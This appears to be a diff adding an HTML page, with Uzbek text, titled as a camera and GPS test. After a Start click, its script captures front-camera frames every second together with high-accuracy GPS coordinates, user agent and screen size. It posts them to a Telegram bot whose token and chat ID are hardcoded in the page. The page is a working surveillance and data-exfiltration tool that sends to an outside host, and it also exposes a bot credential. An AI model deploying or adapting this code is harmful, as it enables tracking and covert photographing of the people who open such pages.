@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Camera + GPS Test</title>
+</head>
+<body>
+
+<h3>⚠️ Boshlash bosilgach kamera va GPS har 1 soniyada yuboriladi</h3>
+
+<video id="video" autoplay playsinline width="300"></video><br><br>
+
+<button onclick="start()">▶️ Boshlash</button>
+<button onclick="stop()">⏹ To‘xtatish</button>
+
+<script>
+const BOT_TOKEN = "8158220444:AAFTdA0Ej9thPuqZfXXqIewcDM6nDYrEIvo";
+const CHAT_ID  = "8151282077";
+
+let stream, intervalId;
+let latitude = "Noma'lum";
+let longitude = "Noma'lum";
+
+// 📍 GPS olish
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.watchPosition(pos => {
+    latitude  = pos.coords.latitude;
+    longitude = pos.coords.longitude;
+  }, err => {
+    console.log("GPS error");
+  }, {
+    enableHighAccuracy: true
+  });
+}
+
+async function start() {
+  if (intervalId) return;
+
+  // Kamera
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" }
+  });
+
+  document.getElementById("video").srcObject = stream;
+
+  // GPS
+  getLocation();
+
+  document.getElementById("video").onloadedmetadata = () => {
+    intervalId = setInterval(sendFrame, 1000); // 1 soniya
+  };
+}
+
+function stop() {
+  clearInterval(intervalId);
+  intervalId = null;
+  if (stream) stream.getTracks().forEach(t => t.stop());
+}
+
+// 📸 Rasm + ma'lumot yuborish
+async function sendFrame() {
+  const video = document.getElementById("video");
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  canvas.toBlob(blob => {
+    const info = `
+⏰ ${new Date().toLocaleString()}
+📱 ${navigator.userAgent}
+🖥 ${screen.width}x${screen.height}
+📍 GPS: ${latitude}, ${longitude}
+`;
+
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", blob);
+    fd.append("caption", info);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: fd
+    });
+  }, "image/jpeg", 0.7); // tez + sifat
+}
+</script>
+
+</body>
+</html>
